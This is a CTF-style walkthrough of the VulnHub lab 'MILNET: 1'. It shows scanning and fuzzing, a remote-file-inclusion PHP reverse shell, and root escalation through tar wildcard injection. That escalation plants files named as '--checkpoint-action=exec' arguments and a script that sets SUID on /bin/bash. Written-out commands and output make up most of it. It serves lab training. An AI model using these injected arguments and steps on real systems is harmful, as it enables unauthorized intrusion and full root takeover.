# MILNET: 1

## 1.GET VM IP

```text
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       (Unknown)
192.168.127.231 00:0c:29:a0:3b:c4       (Unknown)
192.168.127.254 00:50:56:fd:64:8a       (Unknown)
```

The VM IP is `192.168.127.231`, let's enumerate it.

## 2.Enumeration

```text
root@kali: nmap -sV -sC 192.168.127.231 -p- -v -oN fullscan

Nmap scan report for 192.168.127.231
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9b:b5:21:38:96:7f:85:bd:1b:aa:9a:70:cf:db:cd:36 (RSA)
|   256 93:30:be:c2:af:dd:81:a8:25:2b:57:e5:01:49:91:57 (ECDSA)
|_  256 37:40:2b:cc:27:ae:89:22:d0:d2:65:65:c4:9b:53:42 (ED25519)
80/tcp open  http    lighttpd 1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.35
MAC Address: 00:0C:29:A0:3B:C4 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets' see the web page :

![mainPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1d8bfdcd-6cef-4e90-8159-46237d681b72)

analyzing the website shows that it is using basic functions and have basic pages, but if you look closer you see a parameter

that is used to call each page, `route`, which opens new pages :


![route](https://github.com/Git-K3rnel/VulnHub/assets/127470407/7fb366da-a6bd-4447-85c8-1c60876b3dea)

since this is a parameter that loads other pages, i decided to first FUZZ any other pages available by this parameter :

```text
root@kali: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "route=FUZZ" -u http://192.168.127.231/content.php -fs 1

[Status: 200, Size: 146, Words: 7, Lines: 10, Duration: 13ms]
    * FUZZ: index

[Status: 200, Size: 110, Words: 8, Lines: 6, Duration: 14ms]
    * FUZZ: main

[Status: 200, Size: 64312, Words: 2958, Lines: 703, Duration: 12ms]
    * FUZZ: info

[Status: 200, Size: 533, Words: 31, Lines: 16, Duration: 12ms]
    * FUZZ: nav

[Status: 500, Size: 369, Words: 37, Lines: 12, Duration: 609ms]
    * FUZZ: content

[Status: 200, Size: 3902, Words: 519, Lines: 30, Duration: 7ms]
    * FUZZ: bomb

[Status: 200, Size: 254, Words: 26, Lines: 14, Duration: 6ms]
    * FUZZ: props
```

yes, i found `info` directory and navigated to it using firefox `edit and resend`:

![php](https://github.com/Git-K3rnel/VulnHub/assets/127470407/38b760ba-2a44-4598-aea3-b1390c349ab3)

it shows phpinfo which is alot useful, pay attention to this section :

![urlopen](https://github.com/Git-K3rnel/VulnHub/assets/127470407/74d321a3-7aa5-4f23-ad53-aa2d0c3425e6)

this line shows that we can include external URLs and it loads it, meaning we have `RFI` here, the `route`

parameter is interesting because it suspicious to `LFI` too :

![LFI](https://github.com/Git-K3rnel/VulnHub/assets/127470407/25f01221-8a2c-45b0-87a8-9f48772b0242)

as you can see, it loads the info page again. so since we have LFI and RFI here, if first tried to load the

source code of the pages with PHP wrapper base64 encode :

![wrapper](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1483dd4b-0c48-45ab-a622-bb0bbe4d3040)

but it did not show anything.

## 3.Gaining Shell

I tried to use RFI and used pentest monkey php reverse shell and saved it to `revshell.php`

and using python http server i served the file and sent a request to my server to get a reverse shell.

![revshell2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/697ee6df-ce27-4ce6-9b59-ba01419cfbfa)

![revshell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ea55107b-0949-4777-a469-91908ddc07df)

yes, this is our shell.

## 4.Privilege Escalation

One of the first things i do each time gaining access to a machine is to check crontab file and its subdirectories :

```text
$ cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /backup/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

luckily we see that every one minute a file `backup.sh` is beding executed, let see the permission and content of this file :

```text
$ ls -l /backup/backup.sh
-rw-r--r-x 1 root root 57 May 21  2016 /backup/backup.sh

$ cat /backup/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /backup/backup.tgz *
```

as it is shown, it has root permissions and it is going to make a backup of all `/var/www/html` contents by using `tar` command.

i just got confused by the way it is doing it, after alittle research and seeing hacktricks site for `tar` command [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar)

i noticed that using wildcard here is the problem and can lead to arbitary command execution since it is in `Wildcards Spare tricks` section of hacktricks website.

then i researched about tar wildcard exploitation and found hacking articles talking about it [here](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

this the way i exploited this vulnerability :

```text
$ cd /var/www/html

$ echo "" > --checkpoint=1

$ echo "" > "--checkpoint-action=exec=sh shell.sh"

$ echo '#!/bin/bash' > shell.sh

$ echo 'chmod +s /bin/bash' >> shell.sh

$ cat shell.sh
#!/bin/bash
chmod +s /bin/bash
```

wait a minute and then check the permission of the bash executable :

```text
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037464 Sep  1  2015 /bin/bash
```

as we expected there is a SUID on this binary, what we need to do is to execute it like this :

```text
$ /bin/bash -p

id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

cd /root

ls
credits.txt

cat credits.txt
        ,----,
      ,/   .`|
    ,`   .'  :  ,---,                          ,---,.
  ;    ;     /,--.' |                        ,'  .' |                  ,---,
.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'|
|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | :
;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | |
`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| |
    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   |
    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  |
    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  |
    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  '
    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :|
              `--''       \   \  /         |   | ,'  '---'        \   \  /
                           `----'          `----'                  `----'


This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!

If you liked it drop me a line on twitter or in #vulnhub.

I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time...

This VM was inspired by The Cuckoo's Egg.
If you have not read it give it a try:
http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/
```

yes, this is how we can root this machine :)





